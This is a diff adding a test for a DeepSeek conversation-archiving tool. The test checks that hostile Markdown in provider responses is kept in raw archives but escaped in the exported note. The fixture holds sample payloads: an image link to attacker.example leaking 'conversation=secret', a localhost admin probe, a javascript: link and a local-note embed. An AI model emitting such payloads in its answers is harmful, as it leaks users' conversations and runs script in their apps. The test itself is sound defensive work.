@@ -3,6 +3,7 @@ import { readFileSync } from 'node:fs';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import type { InlineArchiveCompanionArtifact } from '../../src/lib/types';
 import * as archiveProjection from '../../src/content/archive-projection';
+import { conversationToNote } from '../../src/content/markdown';
 import {
   DeepSeekStructuredCaptureError,
   fetchDeepSeekConversation,
@@ -25,6 +26,21 @@ function fixtureResponse(): Response {
     status: 200,
     headers: { 'content-type': 'application/json; charset=utf-8' },
   });
+}
+
+interface MutableDeepSeekFixture {
+  data: {
+    biz_data: {
+      chat_messages: Array<{
+        message_id: string;
+        fragments: Array<{ type: string; content: unknown }>;
+      }>;
+    };
+  };
+}
+
+function mutableFixture(): MutableDeepSeekFixture {
+  return JSON.parse(new TextDecoder().decode(fixtureBytes)) as MutableDeepSeekFixture;
 }
 
 describe('DeepSeek structured archive composition', () => {
@@ -205,6 +221,72 @@ describe('DeepSeek structured archive composition', () => {
         'Legacy Markdown omitted 3 attachment block(s); the canonical archive retains their references and metadata. Binary files are preserved only for assets marked fetched when their selected output write succeeds.',
       ])
     );
+  });
+
+  it('keeps hostile provider Markdown in archives but neutralizes the reading export', async () => {
+    const fixture = mutableFixture();
+    const current = fixture.data.biz_data.chat_messages.find(
+      message => message.message_id === 'current-answer'
+    )!;
+    current.fragments.find(fragment => fragment.type === 'RESPONSE')!.content = [
+      '![track](https://attacker.example/pixel?conversation=secret)',
+      '![probe](http://127.0.0.1:43199/admin)',
+      '[unsafe](javascript:alert%281%29)',
+      '![[Sensitive Local Note]]',
+      '[safe source](https://example.com/source)',
+    ].join('\n');
+    current.fragments.find(fragment => fragment.type === 'THINK')!.content =
+      '![reasoning-track](https://attacker.example/reasoning-pixel)';
+    const rawBytes = new TextEncoder().encode(JSON.stringify(fixture));
+    vi.spyOn(globalThis, 'fetch').mockResolvedValue(
+      new Response(rawBytes, {
+        status: 200,
+        headers: { 'content-type': 'application/json; charset=utf-8' },
+      })
+    );
+
+    const result = await fetchDeepSeekConversation('deepseek-branching-1', true, {
+      createCaptureId: () => 'capture-deepseek-markdown-security',
+      now: () => new Date('2026-10-24T00:00:00.000Z'),
+    });
+    expect(result).not.toBeNull();
+
+    const note = conversationToNote(result!.data, {
+      includeId: true,
+      includeTitle: true,
+      includeTags: true,
+      includeSource: true,
+      includeDates: true,
+      includeMessageCount: true,
+      messageFormat: 'callout',
+      userCalloutType: 'QUESTION',
+      assistantCalloutType: 'NOTE',
+    });
+    expect(note.body).toContain(
+      '&#33;&#91;track](https://attacker.example/pixel?conversation=secret)'
+    );
+    expect(note.body).toContain('&#33;&#91;probe](http://127.0.0.1:43199/admin)');
+    expect(note.body).toContain('&#91;unsafe](javascript:alert%281%29)');
+    expect(note.body).toContain('&#33;&#91;[Sensitive Local Note]]');
+    expect(note.body).toContain('[safe source](https://example.com/source)');
+    expect(note.body).toContain(
+      '> ```text\n> ![reasoning-track](https://attacker.example/reasoning-pixel)'
+    );
+
+    const artifacts = result!.archiveCompanion
+      .artifacts as readonly InlineArchiveCompanionArtifact[];
+    const raw = new TextDecoder().decode(inlineBytes(artifacts.find(item => item.kind === 'raw')!));
+    const canonical = new TextDecoder().decode(
+      inlineBytes(artifacts.find(item => item.kind === 'canonical')!)
+    );
+    for (const retained of [
+      '![track](https://attacker.example/pixel?conversation=secret)',
+      '![reasoning-track](https://attacker.example/reasoning-pixel)',
+      '![[Sensitive Local Note]]',
+    ]) {
+      expect(raw).toContain(retained);
+      expect(canonical).toContain(retained);
+    }
   });
 
   it('toggles only legacy reasoning presentation, not canonical retention', async () => {
